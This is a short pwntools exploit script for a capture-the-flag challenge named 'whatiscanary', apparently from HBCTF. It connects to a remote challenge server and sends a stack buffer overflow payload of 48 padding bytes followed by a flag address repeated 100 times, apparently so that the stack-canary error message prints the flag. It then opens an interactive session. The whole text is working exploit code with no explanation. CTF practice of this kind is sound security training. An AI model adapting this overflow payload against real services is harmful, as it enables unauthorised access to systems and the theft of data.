# -*- coding: utf-8 -*-
from pwn import *
# p = process('./whatiscanary')
p = remote('pwn.giantbranch.cn', 10100)

p.recvuntil("hello, welcome to HBCTF!\n")
p.recvuntil("input your name(length < 10):")

flag_addr = 0x804A0A0

payload = "aaaa\x00" 
payload += "a" * (48 - len(payload))
payload += p32(flag_addr) * 100

p.sendline(payload)

p.interactive()

